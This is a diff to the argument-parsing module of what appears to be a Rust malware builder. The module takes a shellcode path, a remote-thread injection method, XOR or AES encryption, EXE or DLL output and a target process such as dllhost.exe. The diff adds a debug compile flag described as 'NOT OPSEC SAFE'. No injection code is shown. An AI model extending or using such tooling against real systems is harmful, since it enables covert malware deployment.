@@ -1,23 +1,29 @@
 // Module that handles the CLI arguments and checks them for correct values.
 
-use clap::{Arg, ArgMatches, Command};
+use clap::{Arg, ArgAction, ArgMatches, Command};
 use std::{path::PathBuf, process::exit};
 
 use crate::tools::absolute_path;
 
-#[derive(Debug)]
+#[derive(Debug, Clone)]
 pub struct Order {
     pub shellcode_path: PathBuf,
     pub execution: Execution,
     pub encryption: Encryption,
     pub format: Format,
     pub target_process: String,
+    pub compile_mode: CompileMode,
     //sandbox: Option<bool>,
     //output: Option<String>,
 }
 
-#[derive(PartialEq)]
-#[derive(Debug)]
+#[derive(Debug, Clone)]
+pub enum CompileMode {
+    Release,
+    Debug,
+}
+
+#[derive(PartialEq, Debug, Clone)]
 pub enum Execution {
     // CreateRemoteThread,
     // CreateThread,
@@ -27,14 +33,13 @@ pub enum Execution {
     WinCreateRemoteThread,
 }
 
-#[derive(Debug)]
+#[derive(Debug, Clone)]
 pub enum Encryption {
     Xor,
     Aes,
 }
 
-#[derive(PartialEq)]
-#[derive(Debug)]
+#[derive(PartialEq, Debug, Clone)]
 pub enum Format {
     Exe,
     Dll,
@@ -87,6 +92,14 @@ fn parser() -> ArgMatches {
                     clap::builder::PossibleValue::new("aes").help("AES 256 encryption"),
                 ]),
         )
+        .arg(
+            Arg::new("Debug mode")
+                .short('d')
+                .required(false)
+                .num_args(0)
+                .action(ArgAction::SetTrue)
+                .help("Compile the malware in debug mode for analysis.")
+        )
         .get_matches()
 }
 
@@ -130,11 +143,18 @@ fn args_checker(args: ArgMatches) -> Result<Order, Box<dyn std::error::Error>> {
         _ => panic!("Don't even know how this error exists."),
     };
 
-
-
     let target_process = match args.get_one::<String>("Target process") {
         Some(name) => name.to_string(),
         None => "dllhost.exe".to_string(),
+    };
+
+    let compile_mode = match args.get_one::<bool>("Debug mode") {
+        Some(true) => {
+            println!("[+] Compiling in debug mode, NOT OPSEC SAFE !");
+            CompileMode::Debug
+        }
+        Some(false) => CompileMode::Release,
+        None => panic!("Don't even know how this error is possible"),
     };
 
     let result = Order {
@@ -143,6 +163,7 @@ fn args_checker(args: ArgMatches) -> Result<Order, Box<dyn std::error::Error>> {
         encryption,
         format,
         target_process,
+        compile_mode,
         //sandbox,
         //output,
     };
